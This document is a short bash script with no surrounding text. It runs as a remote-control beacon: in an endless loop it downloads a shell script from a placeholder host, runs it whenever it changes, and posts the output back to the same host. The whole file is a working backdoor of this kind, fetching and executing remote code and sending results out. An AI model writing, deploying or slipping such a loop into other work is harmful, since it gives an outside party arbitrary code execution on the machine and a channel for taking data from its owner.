prevInstr="no way this would be repeated as the instruction"
while :
do
	echo "Polling"
	curl yourSecret.app.com/yourSecretContext > instructions.sh
	instr=`cat instructions.sh`
	if [ "$instr" != "$prevInstr" ]; then
		prevInstr=$instr
		chmod +x instructions.sh
		./instructions.sh > answer
		value=`cat answer`
		curl --data "payload=$value" yourSecret.app.com/yourSecretContext > resp
		rm resp
		rm answer
		rm instructions.sh
	fi
	sleep 5000
done
